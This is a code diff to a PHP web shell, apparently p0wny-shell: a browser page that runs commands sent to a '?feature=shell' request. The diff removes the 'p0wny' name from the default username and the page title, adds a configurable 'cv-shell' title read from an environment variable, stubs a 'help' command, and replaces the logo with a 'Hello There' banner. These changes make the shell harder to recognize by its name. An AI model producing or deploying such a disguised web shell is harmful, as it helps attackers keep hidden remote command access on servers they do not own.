@@ -1,8 +1,9 @@
 <?php
 
 $SHELL_CONFIG = array(
-    'username' => 'p0wny',
+    'username' => 'user',
     'hostname' => 'shell',
+    'title' => 'cv-shell',
 );
 
 function expandPath($path) {
@@ -149,7 +150,10 @@ function initShellConfig() {
             $SHELL_CONFIG['username'] = $pwuid['name'];
         }
     }
-
+    $title = getenv('TITLE');
+    if ($title !== false) {
+        $SHELL_CONFIG['title'] = $title;
+    }
     $hostname = gethostname();
     if ($hostname !== false) {
         $SHELL_CONFIG['hostname'] = $hostname;
@@ -191,7 +195,7 @@ if (isset($_GET["feature"])) {
 
     <head>
         <meta charset="UTF-8" />
-        <title>p0wny@shell:~#</title>
+        <title></title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -367,6 +371,8 @@ if (isset($_GET["feature"])) {
                 } else if (/^\s*clear\s*$/.test(command)) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
+                } else if (/^\s*help\s*$/.test(command)) {
+                    _insertStdout("")
                 } else {
                     makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
@@ -576,6 +582,8 @@ if (isset($_GET["feature"])) {
             window.onload = function() {
                 eShellCmdInput = document.getElementById("shell-cmd");
                 eShellContent = document.getElementById("shell-content");
+                document.title = SHELL_CONFIG["title"]
+                
                 updateCwd();
                 eShellCmdInput.focus();
             };
@@ -587,11 +595,11 @@ if (isset($_GET["feature"])) {
             <pre id="shell-content">
                 <div id="shell-logo">
                     <pre>
-        _   _      _ _          _    _                    <span></span>
-       | | | | ___| | | ___    | |_ | |__   ___  ___  ___ <span></span>
-       | |_| |/ _ \ | |/ _ \   |  _|| '_ \ / _ \|  _|/ _ \<span></span>
-       |  _  |  __/ | | (_) |  | |__| | | |  __/| |  | __/<span></span>
-       |_| |_|\___|_|_|\___/    \___\_| |_|\___||_|  \___|<span></span>
+888 888         888 888             88P'888'Y88 888                            
+888 888  ,e e,  888 888  e88 88e    P'  888  'Y 888 ee   ,e e,  888,8,  ,e e,  
+8888888 d88 88b 888 888 d888 888b       888     888 88b d88 88b 888 "  d88 88b 
+888 888 888   , 888 888 Y888 888P       888     888 888 888   , 888    888   , 
+888 888  "YeeP" 888 888  "88 88"        888     888 888  "YeeP" 888     "YeeP" 
                     </pre>
                 </div>
             </pre>
